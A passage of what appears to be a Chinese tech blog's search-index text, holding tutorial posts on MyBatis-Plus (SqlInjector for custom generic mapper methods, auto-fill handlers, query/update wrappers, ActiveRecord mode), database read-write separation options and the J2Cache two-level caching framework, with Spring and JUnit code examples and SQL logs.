INTO t_admin ( name, type ) VALUES ( ?, ? )==&gt; Parameters: David(String), 0(Integer)&lt;== Updates: 1==&gt; Preparing: SELECT id,name,type FROM t_admin WHERE id=?==&gt; Parameters: 1(Long)&lt;== Columns: id, name, type&lt;== Row: 1, Alex, 1&lt;== Total: 1 序列化枚举值为前端返回值 如何序列化枚举值为前端返回值？ MyBatis-Plus SQL 注入器SQL 注入器介绍Mybatis-Plus 的 SQL 注入器（SqlInjector）可以自定义各种 SQL 语句，并注入到 MyBatis 全局中，这相当于自定义 Mybatis-Plus 自动注入的方法（例如通用的 CRUD 方法）。之前需要在 SQL 映射文件中配置的 SQL 语句，现在可以通过扩展 SqlInjector 来加载到 MyBatis 环境。在 MyBatis-Plus 中自定义自己的通用方法，可以实现接口 ISqlInjector，也可以继承抽象类 AbstractSqlInjector，或者继承默认实现类 DefaultSqlInjector 来注入通用方法。SQL 注入器的作用是可以在 Mapper 层自定义通用方法，然后将 SQL 模板自动注入到 MyBatis-Plus 中，这样就可以不用在 SQL 映射文件中重复编写 SQL 语句。 注入器和自定义 Mapper 方法 + 编写 SQL 映射文件的区别 使用 SQL 注入器，通常是使用自定义 Mapper（如 CustomBaseMapper）接口继承 BaseMapper 接口，我们自定义的通用方法就写在 CustomBaseMapper 里。然后我们业务相关的 Mapper 继承 CustomBaseMapper 后，就可以直接使用自定义的通用方法了。这一切只需要我们自定义一个 SQL 模板，注入到 MyBatis-Plus 即可，而不是换一张表就得重新编写一次 SQL 映射文件。 SQL 注入器使用案例提示 本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-14。 定义 Mapper 接口定义 Mapper 接口（继承自 BaseMapper），新增自定义的通用方法，以后其他业务 Mapper 都可以继承自这个 CustomBaseMapper 接口 12345public interface CustomBaseMapper&lt;T&gt; extends BaseMapper&lt;T&gt; { List&lt;T&gt; findAll();} 定义方法类1234567891011121314151617public class FindAll extends AbstractMethod { @Override public MappedStatement injectMappedStatement(Class&lt;?&gt; mapperClass, Class&lt;?&gt; modelClass, TableInfo tableInfo) { // 执行的 SQL 语句 String sql = "select * from " + tableInfo.getTableName(); // 方法名称，必须与 Mapper 接口中的方法名一致 String method = "findAll"; // 添加 MappedStatement（作用相当于编写 SQL 映射文件） SqlSource sqlSource = languageDriver.createSqlSource(configuration, sql, modelClass); MappedStatement mappedStatement = this.addSelectMappedStatementForOther(mapperClass, method, sqlSource, modelClass); return mappedStatement; }} 定义 SQL 注入器定义 SQL 注入器，将自定义的通用方法注入到 MyBatis-Plus 全局中 123456789101112public class CustomSqlInjector extends DefaultSqlInjector { @Override public List&lt;AbstractMethod&gt; getMethodList(Class&lt;?&gt; mapperClass, TableInfo tableInfo) { // 获取父类中方法的集合 List&lt;AbstractMethod&gt; methodList = super.getMethodList(mapperClass, tableInfo); // 添加自定义的通用方法 methodList.add(new FindAll()); return methodList; }} 注入 SQL 注入器Spring XML 配置文件1234567891011&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;!-- 注入 SQL 注入器 --&gt; &lt;property name="sqlInjector" ref="customSqlInjector" /&gt;&lt;/bean&gt;&lt;!-- 自定义的 SQL 注入器 --&gt;&lt;bean id="customSqlInjector" class="com.clay.mybatis.injector.CustomSqlInjector" /&gt; SpringBoot 配置类定义 SpringBoot 配置类，将 SQL 注入器注入 Spring 容器中 12345678910@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { @Bean public CustomSqlInjector customSqlInjector() { return new CustomSqlInjector(); }} Junit 单元测试代码 定义业务 Mapper 接口，继承自 CustomBaseMapper 123public interface EmployeeMapper extends CustomBaseMapper&lt;Employee&gt; {} Junit 测试代码 12345678910111213@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper employeeMapper; @Test public void findAll() { List&lt;Employee&gt; list = employeeMapper.findAll(); list.forEach(System.out::println); }} 执行上面的测试代码，控制台输出的日志信息如下： 12345678910111213==&gt; Preparing: select * from t_employee==&gt; Parameters: &lt;== Columns: id, last_name, gender, email, age&lt;== Row: 1, Jim, 1, jim@gmail.com, 26&lt;== Row: 2, Peter, 1, peter@gmail.com, 29&lt;== Row: 3, David, 1, david@gmail.com, 28&lt;== Row: 4, Tom, 1, tom@gmail.com, 25&lt;== Total: 4Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, age=26]Employee [id=2, lastName=Peter, gender=1, email=peter@gmail.com, age=29]Employee [id=3, lastName=David, gender=1, email=david@gmail.com, age=28]Employee [id=4, lastName=Tom, gender=1, email=tom@gmail.com, age=25] EmployeeMapper 接口继承自 CustomBaseMapper 接口，拥有了 findAll 方法；由于 CustomSqlInjector SQL 注入器的存在，会自动将 SQL 模板注入到 MyBatis-Plus 中，这样即使不在 SQL 映射文件中编写 SQL 语句，也能执行对应的 SQL 语句。 MyBatis-Plus 自动填充处理器自动填充处理器介绍MyBatis-Plus 自动填充处理器的工作原理：在插入或者更新数据库表数据之前，直接给 Entity 的属性设置值。实现自动填充功能的核心对象是 MetaObjectHandler 接口和 MetaObject 类，其中的 MetaObject 是 MyBatis 提供的一个用于更加方便、更加优雅地访问对象的属性，并给对象的属性设置值的一个对象。MetaObject 还会用于包装对象，支持对 Object 、Map、Collection 等对象进行包装。本质上 MetaObject 获取对象的属性值或者是给对象的属性设置值，最终是要通过 Reflector（反射器） 获取到属性的对应方法的 Invoker 对象，然后执行 invoke 方法。 自动填充处理器的常用用途 自动填充处理器通常用于对公共字段进行填充，例如数据库表中的创建时间（create_time）以及修改时间（update_time）字段，使用它的好处是可以统一对这些公共字段进行处理，避免编写重复的代码。 自动填充策略说明 使用方法：@TableField(fill = FieldFill.INSERT) 值 描述 DEFAULT 默认不处理 INSERT 插入时填充字段 UPDATE 更新时填充字段 INSERT_UPDATE 插入和更新时填充字段 自动填充处理器使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-15。 自动填充处理器的实现步骤 1、在需要填充的实体类属性上添加注解，例如 @TableFile(fill = FieldFill.INSERT) 2、实现 MetaObjectHandler 接口，自定义自动填充处理器 3、将自定义填充处理器注入到 MyBatis-Plus 全局中 添加 @TableField 注解在实体类的属性上添加 @TableField 注解，并通过注解的 fill 属性指定填充策略 123456789101112131415public class Employee { private Long id; private String lastName; @TableField(fill = FieldFill.INSERT_UPDATE) private String gender; private String email; private Integer age; ... 定义自动填充处理器实现 MetaObjectHandler 接口，定义自动填充处理器类 123456789101112131415161718192021222324252627public class CustomMetaObjectHandler implements MetaObjectHandler { /** * 插入操作，自动填充 */ @Override public void insertFill(MetaObject metaObject) { Object fieldValue = getFieldValByName("gender", metaObject); if (fieldValue == null) { System.out.println("******* 插入操作满足自动填充条件 *******"); this.setFieldValByName("gender", "1", metaObject); } } /** * 更新操作，自动填充 */ @Override public void updateFill(MetaObject metaObject) { Object fieldValue = getFieldValByName("gender", metaObject); if (fieldValue == null) { System.out.println("******* 更新操作满足自动填充条件 *******"); this.setFieldValByName("gender", "1", metaObject); } }} 注入自动填充处理器Spring XML 配置文件1234567891011&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;!-- 注入自动填充处理器 --&gt; &lt;property name="metaObjectHandler" ref="customMetaObjectHandler" /&gt;&lt;/bean&gt;&lt;!-- 自定义的自动填充处理器 --&gt;&lt;bean id="customMetaObjectHandler" class="com.clay.mybatis.handler.CustomMetaObjectHandler" /&gt; SpringBoot 配置类定义 SpringBoot 配置类，将自动填充处理器注入 Spring 容器中 12345678910@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { @Bean public CustomMetaObjectHandler customMetaObjectHandler() { return new CustomMetaObjectHandler(); }} Junit 单元测试代码123456789101112131415161718192021222324@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper employeeMapper; @Test public void insert() { Employee employee = new Employee(); employee.setEmail("clion@gmail.com"); employee.setLastName("Clion"); employee.setAge(26); employeeMapper.insert(employee); } @Test public void update() { Employee employee = new Employee(); employee.setId(1L); employee.setEmail("empty@gmai.com"); employeeMapper.updateById(employee); }} 执行上面的测试代码，控制台输出的日志信息如下： 123456789******* 插入操作满足自动填充条件 *******==&gt; Preparing: INSERT INTO t_employee ( last_name, gender, email, age ) VALUES ( ?, ?, ?, ? )==&gt; Parameters: Clion(String), 1(String), clion@gmail.com(String), 26(Integer)&lt;== Updates: 1******* 更新操作满足自动填充条件 *******==&gt; Preparing: UPDATE t_employee SET gender=?, email=? WHERE id=?==&gt; Parameters: 1(String), empty@gmai.com(String), 1(Long)&lt;== Updates: 1 观察上面的输出结果，可以发现执行插入和更新操作之前，当实体类的 gender 属性为 NULL 时，其值会被自动填充。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"数据库读写分离（动态数据源切换）介绍",url:"/posts/a6aa7529.html",text:'数据库读写分离方案介绍读写分离要做的事情就是决定一条 SQL 该到哪个数据库去执行，至于谁来做决定数据库这件事，要么数据库中间件去做，要么应用程序自己去做。首先针对应用程序自己去做的场景，读写分离的职责应该属于数据访问层而不是业务层，其次读写分离不应该入侵到代码中。因此在 Service—DAO—ORM— 数据库驱动的调用链中，要想做到代码弱入侵性或者零入侵性，只能将读写分离写在 ORM 层或者数据库驱动层，写在 ORM 层就和具体 ORM 框架耦合，写在数据库驱动层，就和具体数据库耦合。至于在 ORM 层还是在数据库驱动层实现读写分离，主要看更换 ORM 框架和数据库哪个成本更高和实现的难易程度。一般来讲，读写分离（动态数据源切换）的核心方案主要有以下几种： 第一种构建多套环境，优势是方便控制也容易集成一些简单的分布式事务，缺点是非动态同时代码量较多，配置难度大； 第二种是依靠数据库中间件（例如：MyCat），由中间件做读写分离，优势是对整个应用程序都是透明的，缺点是降低性能，不支持多数据源事务； 第三种是应用程序自己去做，例如使用支持读写分离的数据库驱动、使用 Spring 原生提供的 AbstractRoutingDataSource。后者需要控制只读事务和读写事务切换到主库，写操作切换到主库，读操作切换到从库；同时保证单个事务里面所有的 SQL 都是在同一个数据源里执行。缺点是多数据源的配置不灵活，不支持多数据源事务。具体实现方式可参考 基于 Service 层的 Spring 路由数据源 + AOP / Annotation、基于 ORM 层的 Spring 路由数据源 + Mybatis 插件 / Annotation。 最佳实践Dynamic-DatasourceDynamic-Datasource 是 MyBatis-Plus 官方的读写分离框架。如果数据源较少，场景不复杂，不需要使用多数据源事务，可以选择上述任意一种读写分离方案。如果需要更多特性，又不想引入数据库中间件，可尝试 Dynamic-Datasource，具体的使用方式建议阅读 官方文档一、官方文档二、开源中国介绍。 优势： 项目启动后支持动态增减数据源 简化 Druid 和 HikariCp 配置，提供全局参数配置 提供自定义数据源来源（默认使用 yml 或 properties 配置） 数据源分组，适用于多种场景，包括纯粹多库、读写分离、一主多从、多主多从、混合模式 使用 Spel 动态参数解析数据源，如从 session，header 和参数中获取数据源。（多租户架构神器） 简单集成 Druid 数据源监控多数据源，简单集成 Mybatis-Plus 简化单表，简单集成 P6sy 格式化 SQL，简单集成 Jndi 数据源 使用正则匹配或 Spel 表达式来切换数据源（实验性功能） 默认支持通过 @DS 注解来动态选择数据源（代码入侵性强），额外支持使用 MyBatis 插件在 ORM 层实现纯读写分离（代码零入侵性），但两者不能同时使用 使用 @DS 注解的时候，支持多层数据源嵌套切换。（一个业务 ServiceA 调用 ServiceB，ServiceB 调用 ServiceC，每个 Service 都是不同的数据源） 劣势 不支持多数据源事务（同一个数据源下支持事务），网上绝大多数普通方案（基于 Spring 路由数据源 ）也都不能支持 如果需要使用到分布式事务，那么架构应该到了微服务化的时候 提示：如果项目中只有几个数据库，但是有强烈使用分布式事务的需求，建议还是使用传统方式自己构建多套环境集成 Atomic 这类方案 约定 只做切换数据源这件核心的事情，并不限制具体操作，切换了数据源可以做任何 CRUD 操作 配置文件中所有以下划线 _ 分割的数据源，首部即为组的名称，相同组名称的数据源会放在一个组下 切换数据源即可以是组名，也可以是具体数据源名称，切换时默认采用负载均衡机制切换 默认的数据源名称为 master，可以通过 spring.datasource.dynamic.primary 修改 方法上的注解优先于类上注解 Sharding-JdbcSharding-Jdbc 是 Apache 的分布式数据库中间件。 参考文献 基于 MyBatis 的读写分离插件 读写分离 Spring + Mybatis 解决方案 其他开源项目 spring-boot-mybatis-rw spring-boot-mybatis-rw docs var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"MyBatis-Plus 入门教程之三",url:"/posts/7d8f3d89.html",text:'大纲 MyBatis-Plus 入门教程之一 MyBatis-Plus 入门教程之二 MyBatis-Plus 入门教程之三 MyBatis-Plus 入门教程之四 MyBatis-Plus 入门教程之五 MyBatis-Plus 入门教程之六 MyBatis-Plus 入门教程之七 前言版本说明本文的教程内容是基于 MyBatis-Plus 3.5.2 版本编写的，若你使用的是 2.x 或其他版本，可能会有部分知识点、案例代码不兼容，一切以 MyBatis-Plus 官方文档为准。 条件构造器提示 1、MyBatis-Plus 条件构造器的条件参数详细介绍可看 这里。 2、本文所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-05。 Wrapper 介绍 Wrapper : 条件构造抽象类，最顶端父类 AbstractWrapper : 用于查询条件封装，生成 sql 的 where 条件 QueryWrapper : 查询条件封装 UpdateWrapper : Update 条件封装 AbstractLambdaWrapper : 使用 Lambda 语法 LambdaQueryWrapper : 用于 Lambda 语法使用的查询 Wrapper LambdaUpdateWrapper : Lambda 更新封装 Wrapper QueryWrapper组装查询条件1234567891011121314151617181920@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装查询条件 */ @Test public void selectList() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.like("last_name", \'i\'); wrapper.isNotNull("email"); wrapper.between("age", 20, 25); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND email IS NOT NULL AND age BETWEEN ? AND ?) 组装排序条件12345678910111213141516171819@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装排序条件 */ @Test public void orderBy() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.orderByDesc("age"); wrapper.orderByAsc("last_name"); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee ORDER BY age DESC,last_name ASC 组装删除条件123456789101112131415161718@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装删除条件 */ @Test public void delete() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.isNull("email"); Integer deleteResult = empMapper.delete(wrapper); System.out.println("deleteResult: " + deleteResult); }} 1DELETE FROM t_employee WHERE (email IS NULL) 组装更新条件1234567891011121314151617181920@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装更新条件 */ @Test public void update() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.ge("age", 26); Employee employee = new Employee(); employee.setLastName("Jim"); Integer updateResult = empMapper.update(employee, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET last_name=? WHERE (age &gt;= ?) 条件的优先级提示 当存在多个条件时，Lambda 表达式中的条件优先执行。 123456789101112131415161718192021@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 条件的优先级 */ @Test public void conditionOrder() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); // Lambda 表达式中的条件优先执行，这里更改姓名中包含a并且（年龄大于26或邮箱为Null）的员工信息 wrapper.like("last_name", "a").and(i -&gt; i.gt("age", 26).or().isNull("email")); Employee employee = new Employee(); employee.setLastName("Albert"); Integer updateResult = empMapper.update(employee, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET last_name=? WHERE (last_name LIKE ? AND (age &gt; ? OR email IS NULL)) 组装 Select 语句12345678910111213141516171819@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装 Select 语句 */ @Test public void selectColumns() { // 查询指定的列 QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.select("last_name", "gender"); List&lt;Map&lt;String, Object&gt;&gt; list = empMapper.selectMaps(wrapper); list.forEach(System.out::println); }} 1SELECT last_name,gender FROM t_employee 组装嵌套子查询123456789101112131415161718@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装嵌套子查询 */ @Test public void nestedSubSelect() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.inSql("id", "select id from t_employee where age &lt;= 28"); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (id IN (select id from t_employee where age &lt;= 28)) Condition 组装条件123456789101112131415161718192021222324@SpringBootTestpublic class QueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * Condition 组装条件 */ @Test public void condition() { Integer minAge = 25; Integer maxAge = null; String lastName = "j"; QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); // 当 Condition 条件成立时，才会拼接 SQL 语句 wrapper.like(StringUtils.isNotBlank(lastName), "last_name", lastName); wrapper.ge(minAge != null, "age", minAge); wrapper.le(maxAge != null, "age", maxAge); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND age &gt;= ?) UpdateWrapper组装更新条件1234567891011121314151617181920212223@SpringBootTestpublic class UpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装更新条件 */ @Test public void update() { UpdateWrapper&lt;Employee&gt; wrapper = new UpdateWrapper&lt;&gt;(); // 更新的条件 wrapper.like("last_name", "a"); wrapper.gt("age", 27); // 更新的字段 wrapper.set("gender", "1"); wrapper.set("email", null); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET gender=?,email=? WHERE (last_name LIKE ? AND age &gt; ?) 组装更新 SQL 语句12345678910111213141516171819202122@SpringBootTestpublic class UpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装更新 SQL 语句 */ @Test public void updateSql() { UpdateWrapper&lt;Employee&gt; wrapper = new UpdateWrapper&lt;&gt;(); // 更新的条件 wrapper.like("last_name", "a"); wrapper.gt("age", 27); // 更新的 SQL 语句 wrapper.setSql("gender = \'1\' and email = null"); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); }} 1UPDATE t_employee SET gender = \'1\' and email = null WHERE (last_name LIKE ? AND age &gt; ?) LambdaQueryWrapper值得一提的是，使用 LambdaQueryWrapper 的好处是可以防止表字段的名称被拼接错。 组装查询条件1234567891011121314151617181920@SpringBootTestpublic class LambdaQueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装查询条件 */ @Test public void selectList() { LambdaQueryWrapper&lt;Employee&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.like(Employee::getLastName, \'j\') .le(Employee::getAge, 28) .eq(Employee::getGender, "1"); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND age &lt;= ? AND gender = ?) 条件的优先级12345678910111213141516171819@SpringBootTestpublic class LambdaQueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 条件的优先级 */ @Test public void conditionOrder() { LambdaQueryWrapper&lt;Employee&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(Employee::getLastName, "jim"); wrapper.and(i -&gt; i.gt(Employee::getAge, 26).or().isNull(Employee::getEmail)); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name = ? AND (age &gt; ? OR email IS NULL)) Condition 组装条件123456789101112131415161718192021222324@SpringBootTestpublic class LambdaQueryWrapperTest { @Autowired private EmployeeMapper empMapper; /** * Condition 组装条件 */ @Test public void condition() { Integer minAge = 25; Integer maxAge = null; String lastName = "j"; LambdaQueryWrapper&lt;Employee&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); // 当 Condition 条件成立时，才会拼接 SQL 语句 wrapper.like(StringUtils.isNotBlank(lastName), Employee::getLastName, lastName) .ge(minAge != null, Employee::getAge, minAge) .le(maxAge != null, Employee::getAge, maxAge); List&lt;Employee&gt; list = empMapper.selectList(wrapper); list.forEach(System.out::println); }} 1SELECT id,last_name,gender,email,age FROM t_employee WHERE (last_name LIKE ? AND age &gt;= ?) LambdaUpdateWrapper值得一提的是，使用 LambdaUpdateWrapper 的好处是可以防止表字段的名称被拼接错。 组装更新条件123456789101112131415161718192021@SpringBootTestpublic class LambdaUpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装更新条件 */ @Test public void update() { LambdaUpdateWrapper&lt;Employee&gt; wrapper = new LambdaUpdateWrapper&lt;&gt;(); wrapper.like(Employee::getLastName, "a") .gt(Employee::getAge, 27) .set(Employee::getGender, "1") .set(Employee::getEmail, null); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); } } 1UPDATE t_employee SET gender=?,email=? WHERE (last_name LIKE ? AND age &gt; ?) 组装更新 SQL 语句1234567891011121314151617181920@SpringBootTestpublic class LambdaUpdateWrapperTest { @Autowired private EmployeeMapper empMapper; /** * 组装更新 SQL 语句 */ @Test public void updateSql() { LambdaUpdateWrapper&lt;Employee&gt; wrapper = new LambdaUpdateWrapper&lt;&gt;(); wrapper.like(Employee::getLastName, "a") .gt(Employee::getAge, 27) .setSql("gender = \'1\' and email = null"); Integer updateResult = empMapper.update(null, wrapper); System.out.println("updateResult: " + updateResult); } } 1UPDATE t_employee SET gender = \'1\' and email = null WHERE (last_name LIKE ? AND age &gt; ?) ActiveRecord 模式Active Record（活动记录）是一种领域模型模式，简称 AR 模式；特点是一个模型类对应关系型数据库中的一个表，而模型类的一个实例对应表中的一行记录。ActiveRecord 一直广受动态语言（PHP 、 Ruby 等）的喜爱，而 Java 作为准静态语言，对于 ActiveRecord 往往只能感叹其优雅，所以 MyBatis-Plus 也在 ActiveRecord 道路上进行了一定的探索。 使用 ActiveRecord 模式使用 ActiveRecord 模式时，仅仅需要让实体类继承 Model 类，并实现指定主键的 pkVal() 方法即可。值得一提的是，如果主键属性的名称本来就是 id，则可以忽略实现 pkVal() 方法。 实体类 12345678910111213141516public class Employee extends Model&lt;Employee&gt; { private Long id; private String lastName; private String gender; private String email; private Integer age; ... @Override public Serializable pkVal() { return this.id; }} 特别注意 必须存在对应的原始 Mapper 接口，并继承 BaseMapper 接口（如下所示）的前提下才能使用 ActiveRecord 模式！ Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} ActiveRecord 模式操作由于 Model 类提供了通用的 CRUD 方法，因此实体类继承 Model 类之后，可以直接执行 CRUD 操作。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-06。 查询数据操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849@SpringBootTestpublic class ActiveRecordTest { /** * 根据ID查询数据 */ @Test public void selectById() { Employee employee = new Employee(); employee.setId(1L); Employee result = employee.selectById(); System.out.println(result); } /** * 查询所有数据 */ @Test public void selectAll() { Employee employee = new Employee(); List&lt;Employee&gt; list = employee.selectAll(); list.forEach(System.out::println); } /** * 根据条件查询数据 */ @Test public void selectByWrapper() { QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.like("last_name", "j"); wrapper.eq("gender", "1"); Employee employee = new Employee(); List&lt;Employee&gt; list = employee.selectList(wrapper); list.forEach(System.out::println); } /** * 查询总记录数 */ @Test public void selectCount() { Employee employee = new Employee(); Long count = employee.selectCount(null); System.out.println("count: " + count); }} 插入数据操作123456789101112131415161718@SpringBootTestpublic class ActiveRecordTest { /** * 插入数据 */ @Test public void insert() { Employee employee = new Employee(); employee.setAge(24); employee.setGender("1"); employee.setLastName("David"); employee.setEmail("david@gmail.com"); boolean insertResult = employee.insert(); System.out.println("insertResult: " + insertResult); }} 更新数据操作1234567891011121314151617181920212223242526272829303132@SpringBootTestpublic class ActiveRecordTest { /** * 根据ID更改数据 */ @Test public void updateById() { Employee employee = new Employee(); employee.setId(1L); employee.setAge(24); employee.setGender("1"); boolean updateResult = employee.updateById(); System.out.println("updateResult: " + updateResult); } /** * 根据条件更改数据 */ @Test public void updateByWrapper() { QueryWrapper&lt;Employee&gt; wraper = new QueryWrapper&lt;&gt;(); wraper.isNull("email"); wraper.eq("gender", "1"); Employee employee = new Employee(); employee.setAge(24); boolean updateResult = employee.update(wraper); System.out.println("updateResult: " + updateResult); }} 删除数据操作1234567891011121314151617181920212223242526272829@SpringBootTestpublic class ActiveRecordTest { /** * 根据ID删除数据 */ @Test public void deleteById() { Employee employee = new Employee(); employee.setId(11L); boolean deleteResult = employee.deleteById(); System.out.println("deleteResult: " + deleteResult); } /** * 根据条件删除数据 */ @Test public void deleteByWrapper() { QueryWrapper&lt;Employee&gt; wraper = new QueryWrapper&lt;&gt;(); wraper.isNull("email"); wraper.eq("gender", "1"); Employee employee = new Employee(); boolean deleteResult = employee.delete(wraper); System.out.println("deleteResult: " + deleteResult); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"J2Cache - 两级缓存框架介绍",url:"/posts/c8f728b3.html",text:'相关站点 J2Cache Gitee J2Cache Java Docs J2Cache 官方视频介绍 J2Cache 官方 PDF 介绍 J2Cache 的简单测试 主流缓存框架 Ehcache、Caffeine 、Spring Cache、Guava Cache、JetCache 主流缓存解决方案 内存缓存（如 Ehcache、Caffeine） — 速度快，进程内可用 集中式缓存（如 Redis、Memcached）— 可同时为多节点提供服务 常见的缓存清除策略 Ehcache 自动清除 程序清除 手工清除 Ehcache 的优缺点 优点： 读写内存，速度快 两级缓存（内存 + 磁盘） 多区域 (Region) 的缓存数据结构 暴露了缓存数据监听接口 支持多种集群部署方式 (JGroups、RMI、Ehcache Server) 缺点： 高峰期重启导致的缓存雪崩 单节点对突发的攻击应付不足 多节点运行时缓存数据不同步 J2Cache 真正解决的问题 使用内存缓存时，一旦应用重启后，由于缓存数据丢失，缓存雪崩，给数据库造成巨大压力，导致应用堵塞 使用内存缓存时，多个应用节点无法共享缓存数据 使用集中式缓存，由于大量的数据通过缓存获取，导致缓存服务的数据吞吐量太大，带宽跑满。现象就是 Redis 服务负载不高，但是由于机器网卡带宽跑满，导致数据读取非常慢 提示：J2Cache 不适合对数据一致性要求很高的业务场景。 J2Cache 的设计思路 在 J2Cache 的最新版本中，默认支持使用 Jgroups、Redis、RabbitMQ、RocketMQ 来同步不同机器节点的一级缓存数据。 J2Cache 数据读取流程 J2Cache 数据更新流程 J2Cache 对第三方组件的支持 支持使用 Ehcache、Ehcache3、Caffeine 作为一级缓存 支持使用 Redis、Memcached 作为二级缓存 支持使用 Fst、Kyro、Fastjson、Java 原生的序列化机制 支持使用 Jgroups、Redis、RabbitMQ、RocketMQ 来同步不同机器节点的一级缓存数据 支持使用 Jedis、Lettuce 作为 Redis 